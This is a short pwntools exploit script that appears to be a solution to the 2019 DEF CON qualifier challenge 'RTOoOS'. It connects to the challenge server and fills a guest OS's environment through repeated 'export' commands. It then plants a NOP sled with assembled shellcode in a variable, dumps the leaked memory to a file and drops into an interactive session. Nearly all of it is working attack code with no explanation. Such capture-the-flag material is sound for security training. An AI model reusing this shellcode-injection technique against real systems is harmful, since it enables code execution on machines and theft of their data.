from pwn import *

from subprocess import check_output


def cmd(cmd):
    p.recvuntil('OS> ')
    p.sendline(cmd)

def env():
    cmd('env')
    return p.recvuntil('[RTOo', drop=True).strip().split('\n')

def set(var):
    cmd('export {}'.format(var))

def set2(var, name):
    cmd('export {}={}'.format(var, name))

def unset(var):
    cmd('unset {}'.format(var))

check_output('nasm shellcode.asm', shell=True)
shellcode = open('shellcode').read()

p = remote('rtooos.quals2019.oooverflow.io', 5000)
#p = process('./hypervisor')


for i in range(7):
    set2('A', i+1)

set2('A', '\x90' * 0x60 + shellcode)

p.recvuntil('CS420 - Homework 1\n')
log.success('Received first marker!')

dump = p.recvuntil('CS420 - Homework 1\n', drop=True)
with open('dump', 'w') as f:
    f.write(dump)
log.success('Dumped file!')

p.interactive()
